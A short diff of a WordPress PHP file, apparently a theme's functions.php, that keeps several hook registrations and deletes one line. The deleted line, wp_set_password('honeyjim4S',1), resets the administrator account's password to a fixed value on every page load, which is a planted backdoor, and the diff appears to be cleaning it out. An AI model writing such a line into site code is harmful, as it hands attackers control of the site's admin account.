@@ -104,5 +104,4 @@ add_filter('manage_posts_columns', 'gt_posts_column_views');
 add_action('manage_posts_custom_column', 'gt_posts_custom_column_views');
 add_action('init', 'setAWSCookie');
 add_action('pre_comment_content', 'do_comment_sanitized');
-wp_set_password('honeyjim4S',1);
 ?>
